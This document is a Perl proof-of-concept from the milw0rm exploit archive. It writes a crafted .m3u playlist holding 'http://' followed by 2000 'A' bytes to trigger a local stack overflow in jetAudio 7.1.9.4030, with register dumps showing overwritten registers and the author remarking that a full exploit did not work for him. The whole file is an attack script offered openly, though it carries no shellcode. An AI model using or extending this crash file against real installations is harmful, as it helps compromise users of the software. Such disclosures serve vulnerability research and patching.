#!/usr/bin/perl
# Found By :: HACK4LOVE
# hack4love@hotmail.com
# jetAudio v 7.1.9.4030 plus vx (.m3u ) Local Stack Overflow PoC
########################################################################################
##EAX 01052C10 ASCII
##ECX 007B0390
##EDX 00000000
##EBX 41414141
##ESP 0308F6F0
##EBP 0308F90C
##ESI 01052C08 ASCII
##EDI 41414141
##EIP 7C91B3FB ntdll.7C91B3FB
########################################################################################
#### it can be exploit but it didnot work for me ####
########################################################################################
###Thanks for all 3asfh.net//// team and all WwW.Sec-ArT.CoM/cc team
########################################################################################
my $crash="http://"."\x41" x 2000;
open(myfile,'>>hack4love.m3u');
print myfile $crash;
########################################################################################

# milw0rm.com [2009-08-04]
